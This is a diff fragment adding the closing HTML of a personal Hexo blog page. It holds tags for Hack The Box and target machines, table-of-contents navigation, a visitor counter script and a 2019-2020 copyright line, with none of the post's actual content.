+	  <i class="fas fa-tags"></i>&nbsp;
+      <a class="tag-none-link" href="/tags/HTB/" rel="tag">#HTB</a> <a class="tag-none-link" href="/tags/%E9%9D%B6%E6%9C%BA/" rel="tag">#靶机</a>
+    </div>
+    
+  
+
+  <div class="divider"></div>
+</div>
+  
+
+  <div class="book-tocbot">
+</div>
+<div class="book-tocbot-menu">
+  <a class="book-toc-expand" onclick="expand_toc()">Expand all</a>
+  <a onclick="go_top()">Back to top</a>
+  <a onclick="go_bottom()">Go to bottom</a>
+</div>
+
+
+<script src="/js/book-toc.js"></script>
+
+</div>
+      </div>
+	  
+    </div>
+  </div>
+  
+  <a class="off-canvas-overlay" onclick="hide_canvas()"></a>
+</div>
+
+<div align="center">
+	<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<span id="busuanzi_container_site_pv">Copyright © ca01h 2019-2020 | 本站总访问量<span id="busuanzi_value_site_pv"></span>次</span>
+<!-- <span class="post-meta-divider">|</span> -->
+<!-- <span id="busuanzi_container_site_uv">本站访客数<span id="busuanzi_value_site_uv"></span>人</span> -->
+</div><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+
+</body>
+</html>
+
+
+
+<script src="/js/book.js"></script>
